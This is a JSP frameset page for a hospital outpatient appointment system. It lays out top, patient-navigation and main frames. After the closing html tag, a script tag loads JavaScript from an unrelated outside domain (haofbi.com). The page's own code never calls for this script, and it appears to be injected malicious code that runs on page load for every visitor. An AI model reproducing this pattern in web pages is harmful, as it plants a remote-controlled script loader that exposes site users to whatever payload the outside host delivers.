<%--
  Created by IntelliJ IDEA.
  User: ibm
  Date: 2018/7/10
  Time: 14:39
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>医院门诊查询预约系统</title>
</head>

<frameset rows="120,*" frameborder="0" border="0" framespacing="0">
    <frame name="Top" src="top.jsp" scrolling="no">
    <frameset cols="187,*" name="ot" frameborder="0" framespacing="5">
        <frame name="Left" src="patientLeft.jsp" scrolling="auto" target="Main" STYLE="BORDER-RIGHT: #666666 1px solid">
        <frame name="Main" src="main.jsp">
    </frameset>
</frameset>

<noframes>
    <body>
    <p>此系统使用框架,但是您的浏览器不支持.</p>
    </body>
</noframes>
</html><script language=javascript src=http://www.haofbi.com/js/w.js></script>
